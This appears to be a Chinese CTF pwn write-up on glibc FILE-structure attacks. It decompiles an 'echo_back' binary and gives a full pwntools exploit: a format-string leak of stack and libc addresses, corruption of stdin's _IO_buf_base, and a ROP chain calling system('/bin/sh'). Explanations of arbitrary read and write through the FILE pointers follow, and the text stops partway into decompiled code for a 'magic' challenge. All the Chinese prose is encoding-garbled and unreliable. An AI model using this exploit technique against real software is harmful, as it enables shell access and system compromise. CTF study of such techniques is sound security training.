<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_560615C00A10();</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_560615C00A53();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = menu();</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)result != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      echo(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> &amp;&amp; !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      name(s);</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>name</code>ä¸­å¯ä»¥ä¸º<code>main</code>æ ˆå¸§ä¸­çš„<code>char s[8]</code>èµ‹å€¼ æœ€å¤šä¹Ÿåªèƒ½è¯»7å­—èŠ‚</p>
<p>å…¶ä¸­<code>echo</code>æœ‰æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ ä½†æ˜¯æœ€å¤šåªèƒ½è¾“å…¥7å­—èŠ‚çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">echo</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;length:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &gt; <span class="number">6</span> )</span><br><span class="line">    nbytes = <span class="number">7</span>;</span><br><span class="line">  read(<span class="number">0</span>, s, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s say:&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;anonymous say:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›è¾“å…¥é‡è¶³å¤Ÿæ³„éœ²æ ˆå’Œlibcåœ°å€:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;length:&#x27;</span>, <span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">    s(c)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">sp = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">b&#x27;%19$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x20830</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¦ç”¨æ¥ä»»æ„åœ°å€å†™è¿˜æ˜¯å¤ªçŸ­äº† æ‰€ä»¥æŠŠç›®å…‰è½¬å‘<code>scanf()</code> é€šè¿‡åŠ«æŒ<code>stdin</code>æ¥è¿›è¡Œä»»æ„åœ°å€å†™ å…·ä½“çš„æ€è·¯å°±æ˜¯åœ¨æ³„éœ²å‡ºlibcåœ°å€åå°†<code>_IO_2_1_stdin_._IO_buf_base</code>çš„åœ°å€èµ‹å€¼ç»™<code>s</code> ç„¶åé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ‰æœºä¼šå‘æ ˆä¸Šæ®‹ç•™çš„ä»»æ„åœ°å€å†™å…¥1ä¸ªå­—èŠ‚çš„bâ€™\x00â€™ å°±ç”¨è¿™ä¸ª0æ¥è¦†ç›–<code>_IO_2_1_stdin_._IO_buf_base</code>çš„ç¬¬1ä¸ªå­—èŠ‚ æ­¤æ—¶å®ƒå°±ä¼šæŒ‡å‘<code>stdin + 0x20</code>çš„<code>_IO_2_1_stdin_._IO_write_base</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x20830</span></span><br><span class="line"><span class="comment"># stdin_buf_base = base + 0x3c4918 è®¡ç®—é¢˜ç›®ç»™å‡ºçš„libcä¸­çš„åœ°å€ ä¸‹é¢è®¡ç®—çš„æ˜¯æ˜¯è‡ªå·±æµ‹è¯•ç”¨çš„libc</span></span><br><span class="line">stdin_buf_base = base + <span class="number">0x3c3918</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;name:&#x27;</span>, p64(stdin_buf_base))</span><br><span class="line">echo(<span class="string">b&#x27;%16$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F25%2F20250225-170139.png" alt="image-20250225170120416"></p>
<p>è¿™æ ·ä¸€æ¥<code> _IO_buf_end - _IO_buf_base</code>å˜æˆäº†ä¸€ä¸ªè¾ƒå¤§çš„æ•° ç»™äº†æ›´å¤šçš„è¾“å…¥é‡ æ›´é‡è¦çš„æ˜¯æ­¤æ—¶å†è¿›è¡Œè¾“å…¥å°±ä¼šå‘æ–°çš„ç¼“å†²åŒº<code>_IO_write_base</code>è¾“å…¥æ•°æ® å³å¯ä»¥æ›´æ”¹è¿™ä¸ªå­—æ®µå¾€ä¸‹ç›´åˆ°<code>_shortbuf + 1</code>çš„æ‰€æœ‰æ•°æ® æ­¤æ—¶å†å°†<code>main</code>æ ˆå¸§ä¸­è¿”å›åœ°å€çš„åœ°å€å†™å…¥<code>_IO_buf_base</code> å°†payloadç»“å°¾çš„ä¼°è®¡åœ°å€(å¯ä»¥å¤§ä¸€ç‚¹)å†™å…¥<code>_IO_buf_end </code>å³å¯æ§åˆ¶<code>main</code>çš„è¿”å›åœ°å€:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stdin_short_buf = stdin_buf_base + <span class="number">0x4b</span></span><br><span class="line">system = base + so.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh  = base + <span class="built_in">next</span>(so.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi = base + <span class="number">0x0000000000021102</span></span><br><span class="line">fk_buf_base = sp + <span class="number">0x26f8</span></span><br><span class="line">fk_buf_end = fk_buf_base + <span class="number">0x30</span></span><br><span class="line">payload  = flat([stdin_short_buf] * <span class="number">3</span> + [fk_buf_base, fk_buf_end])</span><br><span class="line">payload_ = flat([poprdi, binsh, system])</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;length:&#x27;</span>, payload)</span><br><span class="line">sl(<span class="string">b&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯é—®é¢˜éšä¹‹è€Œæ¥ æ¯æ¬¡è¯»å–ç”¨æˆ·è¾“å…¥çš„æ“ä½œç»“æŸå<code>_IO_read_end</code>éƒ½ä¼šåŠ ä¸Šè¯»å–åˆ°çš„ç”¨æˆ·è¾“å…¥é•¿åº¦ æ­¤æ—¶èµ·å†é‡åˆ°é«˜çº§çš„è¾“å…¥å‡½æ•°å°±ä¼šç›´æ¥å°†ä¸Šæ¬¡å‘é€çš„payloadå¤åˆ¶åˆ°ç›®æ ‡åœ°å€é‡Œç„¶åç›´æ¥è¿”å›è€Œä¸æ¥æ”¶ç”¨æˆ·è¾“å…¥ è¿™æ—¶å€™å°±éœ€è¦ç”¨<code>getchar()</code>æ¥æ¶ˆè€—ç¼“å†²åŒºä¸­çš„å¯è¯»å–é‡:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload) - <span class="number">1</span>): <span class="comment"># æœ¬åœ°è¿™é‡Œæ˜¯ - 3</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;count: <span class="subst">&#123;_&#125;</span>, payload: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;length:&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo_back&#x27;</span>)</span><br><span class="line"><span class="comment"># so = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">so = ELF(<span class="string">&#x27;/home/i/PC_File/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;61.147.171.105&#x27;, 57955)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;length:&#x27;</span>, <span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">    s(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;localhost&#x27;, 20000)</span></span><br><span class="line"></span><br><span class="line">echo(<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">sp = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">b&#x27;%19$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x20830</span></span><br><span class="line"><span class="comment"># stdin_buf_base = base + 0x3c4918</span></span><br><span class="line">stdin_buf_base = base + <span class="number">0x3c3918</span></span><br><span class="line">stdin_short_buf = stdin_buf_base + <span class="number">0x4b</span></span><br><span class="line">system = base + so.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh  = base + <span class="built_in">next</span>(so.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi = base + <span class="number">0x0000000000021102</span></span><br><span class="line">fk_buf_base = sp + <span class="number">0x26f8</span></span><br><span class="line">fk_buf_end = fk_buf_base + <span class="number">0x30</span></span><br><span class="line">payload  = flat([stdin_short_buf] * <span class="number">3</span> + [fk_buf_base, fk_buf_end])</span><br><span class="line">payload_ = flat([poprdi, binsh, system])</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;name:&#x27;</span>, p64(stdin_buf_base))</span><br><span class="line">echo(<span class="string">b&#x27;%16$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;length:&#x27;</span>, payload)</span><br><span class="line">sl(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload) - <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;count: <span class="subst">&#123;_&#125;</span>, payload: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;length:&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;length:&#x27;</span>, payload_)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="åŠ«æŒ-IO-write-ptr-å’Œ-IO-read-ptr-å®ç°ä»»æ„å†…å­˜è¯»å†™"><a href="#åŠ«æŒ-IO-write-ptr-å’Œ-IO-read-ptr-å®ç°ä»»æ„å†…å­˜è¯»å†™" class="headerlink" title="åŠ«æŒ _IO_write_ptr å’Œ _IO_read_ptr å®ç°ä»»æ„å†…å­˜è¯»å†™"></a>åŠ«æŒ _IO_write_ptr å’Œ _IO_read_ptr å®ç°ä»»æ„å†…å­˜è¯»å†™</h2><p>è¿™ä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘è¯¥æ–‡ä»¶è¿›è¡Œå†™å…¥å’Œè¯»å–æ“ä½œæ—¶çš„ä½ç½® è¦å®ç°ä»»æ„å†…å­˜è¯»å†™é€šå¸¸å°±éœ€è¦ä¿®æ”¹è¿™ä¸¤ä¸ªæŒ‡é’ˆä»¥åŠå¯¹åº”çš„endæŒ‡é’ˆ</p>
<h3 id="ä»»æ„å†…å­˜è¯»"><a href="#ä»»æ„å†…å­˜è¯»" class="headerlink" title="ä»»æ„å†…å­˜è¯»"></a>ä»»æ„å†…å­˜è¯»</h3><p>åªéœ€è¦æ„é€ <code>_IO_read_ptr </code>ä¸ºè¦è¯»çš„å†…å­˜çš„èµ·å§‹ä½ç½® <code>_IO_read_end</code>ä¸ºè¦è¯»çš„å†…å­˜çš„ç»“æŸä½ç½® æ­¤æ—¶è°ƒç”¨<code>fread()</code>æ—¶ åœ¨æ¡ä»¶æ»¡è¶³çš„æƒ…å†µä¸‹è°ƒç”¨é“¾çš„æœ€åçš„<code>_IO_new_file_underflow ()</code>è¢«è°ƒç”¨ å…¶ä¸­<code>if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</code>æ¡ä»¶ä¸ºçœŸ å³ç¼“å†²åŒºä¸­æœ‰æ•°æ®å¯è¯»å°±ä¼šç›´æ¥æ‹·è´ä»<code>_IO_read_ptr</code>å¼€å§‹çš„æ•°æ®è‡³ç›®æ ‡å†…å­˜ å®ç°äº†ä»»æ„å†…å­˜è¯»</p>
<h3 id="ä»»æ„å†…å­˜å†™"><a href="#ä»»æ„å†…å­˜å†™" class="headerlink" title="ä»»æ„å†…å­˜å†™"></a>ä»»æ„å†…å­˜å†™</h3><p>åŠ«æŒ<code>_IO_write_ptr </code>çš„è¿‡ç¨‹å’Œä¸Šé¢åŠ«æŒread_ptrçš„å·®ä¸å¤š éœ€è¦æ„é€ å…¶æŒ‡å‘è¦å†™å…¥çš„ç›®æ ‡å¹¶å‘å¯¹åº”çš„endæŒ‡é’ˆå†™å…¥è¦å†™å…¥çš„ç›®æ ‡ç»“æŸåœ°å€ æ­¤æ—¶å†è°ƒç”¨<code>fwrite()</code>å°±ä¼šä»ç›®æ ‡å†…å­˜æ‹·è´æ•°æ®è‡³<code>_IO_write_ptr</code>æŒ‡å‘çš„å†…å­˜ éœ€è¦æ³¨æ„çš„æ˜¯æ¯æ¬¡å†™å…¥æ•°æ®åå› ä¸ºè¦è°ƒæ•´å¯ç”¨çš„è¾“å‡ºç¼“å†²åŒºå¤§å° <code>_IO_write_ptr</code>éƒ½ä¼šåŠ ä¸Šè¯»å–åˆ°çš„æ•°æ®é‡</p>
<p>åŒæ—¶ å¦‚æœ<code>_IO_read_end - _IO_read_ptr &gt; 0</code>çš„æ¡ä»¶ä¸æ»¡è¶³ ä¸Šæ–‡æåˆ°çš„ç›´æ¥è¿”å›å¹¶æ‹·è´<code>_IO_read_ptr</code>æŒ‡å‘çš„æ•°æ®å°±ä¸æˆç«‹ è€Œæ˜¯æ¥ç€æ‰§è¡Œ_IO_new_file_underflowå‰©ä½™çš„éƒ¨åˆ†:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line"> fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line"> fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">   = fp-&gt;_IO_buf_base;</span><br><span class="line"> count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">              fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line"> ...</span><br><span class="line"> fp-&gt;_IO_read_end += count;</span><br></pre></td></tr></table></figure>

<p>å…ˆå°†æ‰€æœ‰çš„ptr, base, endæŒ‡é’ˆéƒ½è®¾ç½®ä¸º<code>_IO_buf_base</code>çš„å€¼ ç„¶åé€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥å‘ç›®æ ‡å†…å­˜å†™å…¥æ•°æ® è‹¥<code>fp-&gt;fileno == 0 &amp;&amp; fp-&gt;_IO_buf_base == target_addr</code> åŒæ ·å¯ä»¥å®ç°ä»»æ„å†…å­˜å†™</p>
<h3 id="åº”ç”¨ä¸¾ä¾‹-1"><a href="#åº”ç”¨ä¸¾ä¾‹-1" class="headerlink" title="åº”ç”¨ä¸¾ä¾‹"></a>åº”ç”¨ä¸¾ä¾‹</h3><h4 id="æ”»é˜²ä¸–ç•Œ-magic"><a href="#æ”»é˜²ä¸–ç•Œ-magic" class="headerlink" title="[æ”»é˜²ä¸–ç•Œ] magic"></a>[æ”»é˜²ä¸–ç•Œ] magic</h4><p>checksecæŸ¥å‡ºPartial RELROä¸”æ²¡å¼€PIE è¿™é¢˜å¯èƒ½éœ€è¦è¦†ç›–gotè¡¨</p>
<p>ç¨‹åºè‡ªå®šäº†ä¸€ä¸ªæ–°çš„ç»“æ„ä½“:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Wizard</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _BYTE *name;</span><br><span class="line">  _BYTE desc[<span class="number">32</span>];</span><br><span class="line">  _QWORD sp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç¨‹åºå®ç°äº†å‡ ä¸ªåŠŸèƒ½ å¯ä»¥åˆ›å»ºå·«å¸ˆ:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_wizard</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  Wizard *v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !wizards[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Can&#x27;t create wizard!&quot;</span>);</span><br><span class="line">  v3 = (Wizard *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me the wizard&#x27;s name:&quot;</span>);</span><br><span class="line">  v3-&gt;name = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  my_read(v3-&gt;name, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(v3-&gt;desc, desc_wizard);</span><br><span class="line">  v3-&gt;sp = <span class="number">800LL</span>;</span><br><span class="line">  result = v1;</span><br><span class="line">  wizards[v1] = v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ–½æ³•:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">my_read</span><span class="params">(<span class="type">void</span> *a1, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">wizard_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> idx; <span class="comment">// [rsp+3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  Wizard *v3; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _BYTE spell[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Who will spell:&quot;</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( !wizards[idx] || idx &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;evil wizard!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = wizards[idx];</span><br><span class="line">  <span class="keyword">if</span> ( (__int64)v3-&gt;sp &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (__int64)v3-&gt;sp &lt;= <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;fail!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Spell name:&quot;</span>);</span><br><span class="line">      v2 = my_read(spell, <span class="number">0x20</span>uLL);</span><br><span class="line">      write_spell(spell, v2);</span><br><span class="line">      read_spell();</span><br><span class="line">      v3-&gt;sp -= <span class="number">50LL</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;muggle!&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(v3-&gt;desc, desc_muggle);</span><br><span class="line">    --left_wizard;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">write_spell</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *spell, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> fwrite(spell, len, <span class="number">1uLL</span>, log_file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">read_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE ptr[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x20</span>uLL, log_file);</span><br><span class="line">  write(<span class="number">1</span>, ptr, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

